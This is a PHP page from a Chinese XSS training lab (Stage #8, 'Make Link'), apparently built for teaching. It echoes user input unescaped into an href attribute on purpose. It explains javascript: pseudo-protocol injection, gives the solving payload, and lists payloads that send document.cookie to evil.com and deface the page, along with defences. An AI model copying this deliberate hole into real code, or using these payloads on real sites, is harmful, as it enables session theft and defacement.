<?php
/**
 * XSS Challenges - Stage #8
 * 14.4 Make Link（JavaScript伪协议）
 *
 * 漏洞成因：
 *   用户输入被插入到 <a href=""> 标签中
 *   input value 和链接文字位置过滤了 <> ，但 href 不过滤
 *   可以使用 javascript: 伪协议执行脚本
 *
 * 通关 Payload：
 *   javascript:alert(document.domain)
 */

// 获取参数
$p1 = isset($_GET['p1']) ? $_GET['p1'] : '';
$searched = isset($_GET['p1']);

// input value 和链接文字位置使用 htmlspecialchars 转义
$filtered = htmlspecialchars($p1, ENT_QUOTES, 'UTF-8');
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <title>XSS Challenges - Stage #8</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
<header>
  <a class="logo" href="../../index.php">极客事纪 XSS<span>·</span>Challenges靶场</a>
  <nav><a href="../../index.php">首页</a></nav>
</header>

<div class="stage-banner">
  <span class="stage-badge">STAGE #8</span>
  <h1>Make Link</h1>
  <span class="difficulty">难度：★★★☆☆ 中级</span>
</div>

<main>
  <div class="task-card">
    <h2>任务目标</h2>
    <p>在链接输入框中注入 XSS 代码，使页面弹出 <code>alert</code> 对话框，内容显示当前页面的 <strong>document.domain</strong>。<br>表单参数名为 <code style="color:#e94560;">p1</code>，通过 GET 方式提交。</p>
    <div class="hint">💡 提示（选中以下文字查看）：<span class="hint-content">input 和链接文字过滤了 &lt;&gt;，但 href 属性没有过滤。试试在 href 中使用 javascript: 伪协议。</span></div>
  </div>

  <div class="lab-area">
    <h2>🔗 靶场第八关</h2>
    <?php if ($searched): ?>
    <div class="url-bar">GET <?php echo htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES, 'UTF-8'); ?>?<span class="url-key">p1</span>=<span class="url-val"><?php echo htmlspecialchars($p1, ENT_QUOTES, 'UTF-8'); ?></span></div>
    <?php endif; ?>
    <form class="search-form" method="GET" action="">
      <input type="text" name="p1" value="<?php echo $filtered; ?>" />
      <button type="submit">生成链接</button>
    </form>
    <div class="result-area">
      <div class="result-label">链接生成</div>
      <div class="result-text">
        <?php if ($searched): ?>
        <a href="<?php echo $p1; ?>"><?php echo $filtered; ?></a>
        <?php else: ?><span class="result-empty">暂无链接记录</span><?php endif; ?>
      </div>
    </div>
  </div>

  <div class="knowledge-section">
    <button class="knowledge-toggle" onclick="this.parentElement.classList.toggle('expanded')">
      <span class="toggle-icon">▶</span> 知识点解析
    </button>
    <div class="knowledge-content">

    <div class="knowledge-item">
      <h3>后端 PHP 漏洞代码</h3>
      <p>本关中，用户输入被回显到三个位置，但过滤策略不同：</p>
      <div class="code-block"><span class="hl-comment">// 获取 GET 参数 p1，无任何过滤</span>
<span class="hl-var">$p1</span> = <span class="hl-php">isset</span>(<span class="hl-var">$_GET</span>[<span class="hl-str">'p1'</span>]) ? <span class="hl-var">$_GET</span>[<span class="hl-str">'p1'</span>] : <span class="hl-str">''</span>;

<span class="hl-comment">// input value 和链接文字位置使用 htmlspecialchars 转义（&lt;&gt;&quot;&gt; 都会被转义）</span>
<span class="hl-var">$filtered</span> = <span class="hl-php">htmlspecialchars</span>(<span class="hl-var">$p1</span>, <span class="hl-var">ENT_QUOTES</span>, <span class="hl-str">'UTF-8'</span>);

<span class="hl-comment">// ✅ input value — 使用 $filtered，&lt;&gt;&quot;&gt; 被转义，<span style="color:#4ade80;">安全</span></span>
<span class="hl-php">echo</span> <span class="hl-str">'&lt;input type="text" value="'</span> . <span class="hl-var">$filtered</span> . <span class="hl-str">'" /&gt;'</span>;

<span class="hl-comment">// ✅ 链接文字 — 使用 $filtered，&lt;&gt;&quot;&gt; 被转义，<span style="color:#4ade80;">安全</span></span>
<span class="hl-comment">// ❌ href 属性 — 直接使用 $p1，<span style="color:#e94560;">无任何过滤，存在 XSS！</span></span>
<span class="hl-php">echo</span> <span class="hl-str">'&lt;a href="'</span> . <span class="hl-var">$p1</span> . <span class="hl-str">'"&gt;'</span> . <span class="hl-var">$filtered</span> . <span class="hl-str">'&lt;/a&gt;'</span>;</div>
      <p>关键漏洞：<code>href</code> 属性直接使用原始值 <code>$p1</code>，没有任何过滤。虽然 <code>htmlspecialchars</code> 转义了 <code>&lt;</code> <code>&gt;</code>，但 <code>javascript:</code> 伪协议根本不包含这些字符，因此完全不受影响。</p>
    </div>

    <div class="knowledge-item">
      <h3>例1：什么是 JavaScript 伪协议</h3>
      <p>在 HTML 中，<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性不仅支持 <code>http://</code>、<code>https://</code> 等标准协议，还支持 <code>javascript:</code> 伪协议：</p>
      <div class="code-block"><span class="hl-tag">&lt;a</span> <span class="hl-attr">href</span>=<span class="hl-val">"https://example.com"</span><span class="hl-tag">&gt;</span>正常链接<span class="hl-tag">&lt;/a&gt;</span>     <span class="hl-comment">← 跳转到网页</span>
<span class="hl-tag">&lt;a</span> <span class="hl-attr">href</span>=<span class="hl-val">"javascript:alert(1)"</span><span class="hl-tag">&gt;</span>XSS 链接<span class="hl-tag">&lt;/a&gt;</span>  <span class="hl-comment">← 执行 JS 代码</span></div>
      <p>当用户点击链接时，浏览器会将 <code>javascript:</code> 后面的内容当作 JavaScript 代码来执行，而不是当作 URL 去导航。</p>
    </div>

    <div class="knowledge-item">
      <h3>例2：Payload 构造与注入过程</h3>
      <p>Payload 构造：</p>
      <div class="code-block">stage8.php?p1=<span class="hl-inject">javascript:alert(document.domain)</span></div>
      <p>服务端输出（三个位置对比）：</p>
      <div class="code-block"><span class="hl-comment">&lt;!-- input value — htmlspecialchars 转义了 &lt;&gt;&quot;&gt;，javascript: 不受影响 --&gt;</span>
<span class="hl-tag">&lt;input</span> <span class="hl-attr">type</span>=<span class="hl-val">"text"</span> <span class="hl-attr">value</span>=<span class="hl-val">"&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"</span> <span class="hl-tag">/&gt;</span>

<span class="hl-comment">&lt;!-- 链接文字 — htmlspecialchars 转义了 &lt;&gt;&quot;&gt; --&gt;</span>
<span class="hl-tag">&lt;a</span> <span class="hl-attr">href</span>=<span class="hl-val">"<span class="hl-inject">javascript:alert(document.domain)</span>"</span><span class="hl-tag">&gt;</span>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;<span class="hl-tag">&lt;/a&gt;</span></div>
      <p>用户点击链接后，浏览器执行 <code>alert(document.domain)</code>，弹出当前域名。<strong>注入点在 href 属性值中</strong>，属于 HTML 属性上下文，<code>htmlspecialchars</code> 转义了尖括号，但 <code>javascript:</code> 伪协议本身不含尖括号，不受影响。</p>
      <p>⚠️ <strong>注意：</strong><code>javascript:</code> 伪协议必须<strong>由用户主动点击</strong>才能触发，不会自动执行。这是一种<strong>社会工程学</strong>攻击——攻击者需要诱导用户点击链接。</p>
    </div>

    <div class="knowledge-item">
      <h3>例3：更复杂的伪协议 Payload</h3>
      <p>可以使用更复杂的 JavaScript 代码来窃取 Cookie、跳转钓鱼页面等：</p>
      <div class="code-block"><span class="hl-comment">// 窃取 Cookie 并发送到攻击者服务器</span>
<span class="hl-inject">javascript:document.location='http://evil.com/steal?c='+document.cookie</span>

<span class="hl-comment">// 修改页面内容</span>
<span class="hl-inject">javascript:document.body.innerHTML='&lt;h1&gt;页面已被篡改&lt;/h1&gt;'</span>

<span class="hl-comment">// 使用 void(0) 避免页面跳转</span>
<span class="hl-inject">javascript:void(alert(document.domain))</span></div>
    </div>

    <div class="knowledge-item">
      <h3>互动思考 💬</h3>
      <p><strong>问：</strong><code>javascript:</code> 伪协议在现代浏览器中还有效吗？</p>
      <p><strong>答：</strong>大部分现代浏览器仍然支持 <code>javascript:</code> 伪协议，但有逐渐收紧的趋势。例如：</p>
      <ul>
        <li><strong>Chrome/Firefox：</strong>在用户直接点击链接时仍然有效，但在地址栏输入会被阻止</li>
        <li><strong>禁用条件：</strong>如果链接有 <code>target="_blank"</code> 且页面设置了 CSP（Content Security Policy）的 <code>script-src</code>，可能会被阻止</li>
        <li><strong>安全防护：</strong>可通过 CSP 的 <code>default-src 'self'</code> 或对 href 值做白名单校验（只允许 <code>http://</code> <code>https://</code>）来防御</li>
      </ul>
    </div>
    </div>
  </div>
</main>

<footer> 极客事纪 XSS Challenges靶场 &nbsp;·&nbsp; 仅供 <span>安全学习</span> 使用 </footer>
</body>
</html>
